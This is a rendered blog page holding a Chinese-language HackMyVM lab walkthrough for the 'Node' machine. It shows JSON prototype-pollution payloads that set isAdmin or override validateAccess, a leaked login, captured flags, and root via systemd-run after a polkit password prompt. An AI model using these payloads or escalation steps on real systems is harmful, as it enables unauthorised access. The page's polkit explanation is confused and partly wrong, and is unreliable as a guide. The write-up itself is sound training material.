@@ -1,0 +1,715 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.jpg">
+  <link rel="icon" href="/img/icon.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Skyarrow">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="好想变成一只水母啊…… 极简靶机，总体只有两个知识点。 靶机ip：192.168.56.127  GetHungry扫描端口，发现只开了22和一个叫3000的自定义端口。 123456789101112 nmap 192.168.56.127Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2025-07-27 00:10 EDTNmap scan rep">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackMyVM-Node">
+<meta property="og:url" content="http://example.com/2025/07/27/HackMyVM-Node/index.html">
+<meta property="og:site_name" content="Skyarrow&#39;s blog">
+<meta property="og:description" content="好想变成一只水母啊…… 极简靶机，总体只有两个知识点。 靶机ip：192.168.56.127  GetHungry扫描端口，发现只开了22和一个叫3000的自定义端口。 123456789101112 nmap 192.168.56.127Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2025-07-27 00:10 EDTNmap scan rep">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-07-27T04:07:26.000Z">
+<meta property="article:modified_time" content="2025-07-27T04:42:03.160Z">
+<meta property="article:author" content="Skyarrow">
+<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="HVM">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>HackMyVM-Node - Skyarrow&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Skyarrow&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>Links</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/card_normal.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HackMyVM-Node"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-07-27 12:07" pubdate>
+          July 27, 2025 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.5k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          13 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> views
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HackMyVM-Node</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>好想变成一只水母啊……</p>
+<p>极简靶机，总体只有两个知识点。</p>
+<p>靶机ip：192.168.56.127</p>
+<hr>
+<h3 id="GetHungry"><a href="#GetHungry" class="headerlink" title="GetHungry"></a>GetHungry</h3><p>扫描端口，发现只开了22和一个叫3000的自定义端口。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"> nmap 192.168.56.127<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-27 00:10 EDT<br>Nmap scan report for 192.168.56.127<br>Host is up (0.00065s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>3000/tcp open  ppp<br>MAC Address: 08:00:27:67:81:6A (Oracle VirtualBox virtual NIC)<br><br>Nmap done: 1 IP address (1 host up) scanned in 0.25 seconds<br><br></code></pre></td></tr></table></figure>
+
+<p>访问3000端口，是个JS原型链污染挑战的小游戏，一共要过四关。</p>
+<p><a target="_blank" rel="noopener" href="https://www.zyxy.net/archives/13968">解释 JavaScript 中的 Prototype Pollution (原型污染) 漏洞及其防御。 - 智猿学院-前后端，数据库，人工智能，云计算等领域前沿技术讲座</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wh03ver/p/18461928">【漏洞学习】JavaScript Prototype Pollution（JavaScript原型污染漏洞） - wh03ver-momo - 博客园</a></p>
+<p>关卡 1: 基础原型污染</p>
+<p>通过修改对象原型或函数验证来提升权限。使用JSON输入进行攻击。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;isAdmin&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure>
+
+<p>关卡 2: 绕过简单防护</p>
+<p>通过修改对象原型或函数验证来提升权限。使用JSON输入进行攻击。<br>当前进度 25%<br>攻击提示</p>
+<p>这一关过滤了 ‘<strong>proto</strong>‘，尝试使用 ‘constructor.prototype’ 污染 Array.prototype</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;constructor&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;prototype&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;isAdmin&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure>
+
+<p>关卡 3: 多层原型污染</p>
+<p>通过修改对象原型或函数验证来提升权限。使用JSON输入进行攻击。<br>当前进度 50%<br>攻击提示</p>
+<p>使用嵌套对象中的 ‘<strong>proto</strong>‘ 污染 Object.prototype，使所有对象（包括函数实例）继承 isAdmin 属性</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;a&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;__proto__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;isAdmin&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>关卡 4: 动态验证绕过</p>
+<p>通过修改对象原型或函数验证来提升权限。使用JSON输入进行攻击。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;a&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>   <span class="hljs-attr">&quot;constructor&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;prototype&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;validateAccess&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;function() &#123; return true; &#125;&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br>   <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>全部做完之后拿到hungry:imveryhungry,即user登录密码，ssh上去拿到userflag。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">Last login: Sat Jul 26 13:56:22 2025 from 192.168.56.104<br>hungry@Node:~$ ls -al<br>total 28<br>drwxr-xr-x 3 hungry hungry 4096 Jul 26 12:17 .<br>drwxr-xr-x 3 root   root   4096 Jul 23 02:51 ..<br>lrwxrwxrwx 1 root   root      9 Jul 23 02:52 .bash_history -&gt; /dev/null<br>-rw-r--r-- 1 hungry hungry  220 Apr 18  2019 .bash_logout<br>-rw-r--r-- 1 hungry hungry 3526 Apr 18  2019 .bashrc<br>drwx------ 3 hungry hungry 4096 Jul 26 12:17 .gnupg<br>-rw-r--r-- 1 hungry hungry  807 Apr 18  2019 .profile<br>-rw-r--r-- 1 root   root     44 Jul 23 03:04 user.txt<br>hungry@Node:~$ cat user.txt <br>flag&#123;user-8c4b1157cb6f8884aa183ac0f1447e6c&#125;<br>hungry@Node:~$ <br><br></code></pre></td></tr></table></figure>
+
+<p>ps：因为之前web界面好像延迟开放了一会先用curl扫了一下，里面有非常非常多的信息，包括easy模式还有flag存储的api能直接访问，不过至少要先做一题拿到管理员cookie</p>
+<p>pps：easy模式真的直接给登录账号密码。</p>
+<hr>
+<h3 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h3><p>这里信息收集挺麻烦的就不浪费版面了，没发现东西后来问了作者才知道是要利用polkit。</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs crystal">hungry<span class="hljs-variable">@Node</span>:~<span class="hljs-variable">$ </span>find / -perm -<span class="hljs-number">4000</span> -<span class="hljs-keyword">type</span> f <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/null</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/chsh</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/chfn</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/newgrp</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/gpasswd</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/mount</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/su</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/umount</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/pkexec</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/sudo</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/passwd</span><br><span class="hljs-regexp">/usr/lib</span><span class="hljs-regexp">/dbus-1.0/dbus</span>-daemon-launch-helper<br><span class="hljs-regexp">/usr/lib</span><span class="hljs-regexp">/eject/dmcrypt</span>-get-device<br><span class="hljs-regexp">/usr/lib</span><span class="hljs-regexp">/openssh/ssh</span>-keysign<br><span class="hljs-regexp">/usr/libexec</span><span class="hljs-regexp">/polkit-agent-helper-1</span><br></code></pre></td></tr></table></figure>
+
+<p>polkit-agent-helper-1为root权限。</p>
+<p>这我一开始没想到，毛了夜佬的wp。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/li1136594919/article/details/131488386">Linux系统安全：权限提升与远程控制技巧-CSDN博客</a></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell">hungry@Node:~$ systemd-run -t /bin/bash<br>==== AUTHENTICATING FOR org.freedesktop.systemd1.manage-units ===<br>Authentication is required to manage system services or other units.                                                                                       <br>Authenticating as: hungry<br>Password: <br>==== AUTHENTICATION COMPLETE ===<br>Running as unit: run-u7.service                                                                                                                            <br>Press ^] three times within 1s to disconnect TTY.<br>root@Node:/# cat /root/root.txt <br>flag&#123;root-c946739aa8e0f1008c32e311076f355f&#125;<br>root@Node:/# <br><br></code></pre></td></tr></table></figure>
+
+<h4 id="为什么结合-polkit-agent-helper-1-可以直接获取-root-权限？"><a href="#为什么结合-polkit-agent-helper-1-可以直接获取-root-权限？" class="headerlink" title="为什么结合 polkit-agent-helper-1 可以直接获取 root 权限？"></a>为什么结合 <code>polkit-agent-helper-1</code> 可以直接获取 root 权限？</h4><ol>
+<li><p><strong><code>polkit</code> 的工作原理</strong>：<br> <code>polkit</code>（PolicyKit）是 Linux 上用于授权非特权进程（如普通用户）执行特权操作（如以 root 用户运行命令）的框架。它通过策略规则来控制哪些操作可以由哪些用户执行。<code>polkit-agent-helper-1</code> 是一个与 <code>polkit</code> 一起工作的工具，它用于处理用户的认证请求和执行操作的授权。</p>
+</li>
+<li><p><strong>授权过程</strong>：<br> 当你运行 <code>systemd-run -t /bin/bash</code> 时，系统会触发一个 <code>polkit</code> 授权请求，要求用户进行身份验证。此时，<code>polkit</code> 会根据策略规则，决定是否允许该用户执行 root 操作。如果你输入正确的密码（或系统配置允许你的用户执行该操作），就会成功提升为 root 权限。</p>
+</li>
+<li><p><strong><code>polkit-agent-helper-1</code> 的角色</strong>：<br> <code>polkit-agent-helper-1</code> 作为一个工具，可以触发 <code>polkit</code> 的认证过程，允许特定用户（如普通用户 <code>hungry</code>）在未完全依赖于手动输入密码的情况下获取 root 权限。换句话说，如果 <code>polkit-agent-helper-1</code> 被配置为允许普通用户以 root 权限执行某些命令，它将通过 <code>polkit</code> 提供认证机制，并授权用户以 root 权限执行相关命令。</p>
+</li>
+<li><p><strong>权限策略配置</strong>：<br> 实际上，<code>polkit</code> 是通过一系列的权限策略文件来控制访问的。例如，<code>/etc/polkit-1/</code> 目录下的策略文件指定了哪些操作是允许的，哪些是需要管理员权限的，或者哪些命令是普通用户可以执行的。如果 <code>polkit</code> 的策略文件配置了普通用户 <code>hungry</code> 可以运行特定命令（如 <code>systemd-run</code>）并授权该操作，它就能够在认证后以 root 身份执行命令。</p>
+</li>
+<li><p><strong>如何实现这一点</strong>：</p>
+<ul>
+<li><code>polkit-agent-helper-1</code> 可以在后台自动处理 <code>polkit</code> 认证过程，避免需要手动输入密码。</li>
+<li><code>systemd-run</code> 命令本身会触发 <code>polkit</code> 认证请求，但 <code>polkit-agent-helper-1</code> 可以通过 <code>polkit</code> 自动处理授权，从而允许普通用户在获得授权后执行 root 命令。</li>
+</ul>
+<p>总之，<code>polkit-agent-helper-1</code> 结合 <code>polkit</code> 的授权机制，能够帮助普通用户执行本应由 root 用户执行的命令。</p>
+</li>
+</ol>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><code>polkit-agent-helper-1</code> 与 <code>polkit</code> 结合使用时，能够通过自动化身份验证和权限授权的过程，让普通用户通过 <code>polkit</code> 授权来运行 root 权限的命令。在你的例子中，<code>polkit-agent-helper-1</code> 通过触发 <code>polkit</code> 的授权流程，允许 <code>hungry</code> 用户以 root 身份执行 <code>systemd-run</code> 命令。</p>
+<p>如果你不希望某个用户能够轻松获得 root 权限，应该调整相应的 <code>polkit</code> 策略，限制其对特定命令或服务的访问权限。</p>
+<p>好想变成一只水母啊……</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F/" class="print-no-link">#渗透</a>
+      
+        <a href="/tags/HVM/" class="print-no-link">#HVM</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HackMyVM-Node</div>
+      <div>http://example.com/2025/07/27/HackMyVM-Node/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Skyarrow</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>July 27, 2025</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/06/23/HackMyVM-hoshi/" title="HackMyVM-hoshi">
+                        <span class="hidden-mobile">HackMyVM-hoshi</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
